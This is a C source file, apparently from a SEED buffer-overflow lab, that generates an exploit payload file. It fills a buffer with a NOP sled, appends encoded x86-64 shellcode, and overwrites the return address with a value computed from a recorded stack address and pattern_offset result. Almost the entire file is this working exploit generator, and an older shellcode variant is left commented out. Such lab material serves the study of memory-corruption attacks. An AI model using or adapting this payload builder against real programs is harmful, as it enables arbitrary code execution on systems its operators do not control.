#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

// from the online definition of little endian conversion
uint64_t to_little_endian_64(uint64_t big_endian) {
  uint64_t little_endian = 0;
  little_endian |= (big_endian & 0x00000000000000FF) << 56;
  little_endian |= (big_endian & 0x000000000000FF00) << 40;
  little_endian |= (big_endian & 0x0000000000FF0000) << 24;
  little_endian |= (big_endian & 0x00000000FF000000) << 8;
  little_endian |= (big_endian & 0x000000FF00000000) >> 8;
  little_endian |= (big_endian & 0x0000FF0000000000) >> 24;
  little_endian |= (big_endian & 0x00FF000000000000) >> 40;
  little_endian |= (big_endian & 0xFF00000000000000) >> 56;
  return little_endian;
}

int main() {
  /*
  unsigned char buf[] =
      "\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05\xef"
      "\xff\xff\xff\x48\xbb\x6a\xfe\xb0\x95\x33\xc6\x55\x06\x48"
      "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x22\x46\x9f"
      "\xf7\x5a\xa8\x7a\x75\x02\xfe\x29\xc5\x67\x99\x07\x60\x02"
      "\xd3\xd3\xc1\x6d\x94\xbd\x0e\x6a\xfe\xb0\xba\x51\xaf\x3b"
      "\x29\x06\x8d\xb0\xc3\x64\x92\x0b\x6c\x51\xa6\xbf\x90\x33"
      "\xc6\x55\x06";
  */
  unsigned char buf[] =
      "\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05\xef"
      "\xff\xff\xff\x48\xbb\x12\x5e\xf0\x70\x16\x56\x0c\xd9\x48"
      "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x5a\xe6\xdf"
      "\x12\x7f\x38\x23\xaa\x7a\x5e\x69\x20\x42\x09\x5e\xbf\x7a"
      "\x73\x93\x24\x48\x04\xe4\xd1\x12\x5e\xf0\x5f\x74\x3f\x62"
      "\xf6\x7e\x2d\xf0\x26\x41\x02\x52\xb3\x29\x06\xff\x75\x16"
      "\x56\x0c\xd9";

  int buffer_size = 312;               // pattern_offset result
  uint64_t rbp_addr = 0x7fffffffe3d0;  // ebp from seed vm
  int shellcode_len = sizeof(buf) - 1; // no null byte
  int nops = 200;

  printf("Shellcode Length [+]: %d\n", shellcode_len);

  int go_back =
      shellcode_len + 16 + 100; // before shellcode into nopsled padding
  uint64_t addr = rbp_addr - go_back;
  printf("Return address [+]: %lx\n", addr);

  unsigned char *content = malloc(buffer_size + sizeof(addr));

  // load nops to start of buffer
  for (int i = 0; i < buffer_size - shellcode_len; i++) {
    content[i] = 0x90;
  }

  // load shellcode into end of buffer
  for (int i = 0; i < shellcode_len; i++) {
    content[i + buffer_size - shellcode_len] = buf[i];
  }

  uint64_t li_addr = to_little_endian_64(addr);
  memcpy(&(content[buffer_size]), &addr, sizeof(uint64_t));
  printf("Return address little endian [+]: %lx\n", li_addr);

  FILE *file = fopen("payload", "w");
  if (file == NULL) {
    perror("Error openning file");
    return 1;
  }
  int n = write(fileno(file), content, buffer_size + sizeof(addr));
  printf("Payload written to file payload: %d\n", n);

  return 0;
}
